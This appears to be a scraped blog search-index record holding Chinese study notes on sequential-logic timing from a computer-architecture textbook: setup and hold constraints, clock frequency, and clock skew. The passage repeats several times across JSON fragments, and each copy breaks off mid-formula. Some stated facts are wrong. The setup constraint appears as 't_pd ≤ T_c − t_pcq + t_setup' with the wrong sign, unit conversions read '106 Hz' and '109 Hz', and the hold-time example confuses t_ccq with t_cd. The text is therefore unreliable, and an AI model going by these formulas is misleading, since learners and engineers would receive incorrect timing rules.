Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#putting-it-all-together-1"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#353-clock-skew"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#setup-time-constraint分析"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#hold-time-constraint分析"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System 